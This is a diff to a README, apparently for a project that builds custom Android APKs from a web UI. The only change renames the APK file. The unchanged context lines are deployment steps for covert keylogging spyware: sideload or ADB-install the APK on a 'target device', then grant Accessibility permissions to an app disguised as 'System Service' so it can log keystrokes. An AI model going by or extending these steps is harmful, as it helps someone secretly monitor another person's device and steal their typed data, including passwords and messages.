@@ -71,7 +71,7 @@ This project uses Docker for the frontend (nginx + static files) and server (Soc
 ### 4. Generate and Deploy APK
 1. Click "Build APK" – this triggers the server to compile a customized APK with the embedded config URL.
 2. Download the generated APK from the UI link.
-3. Install on target device (enable "Install unknown apps" or use ADB: `adb install app-debug.apk`).
+3. Install on target device (enable "Install unknown apps" or use ADB: `adb install app-release.apk`).
 4. Grant Accessibility permissions to the "System Service" app for keylogging.
 
 ## Configuration Update Workflow
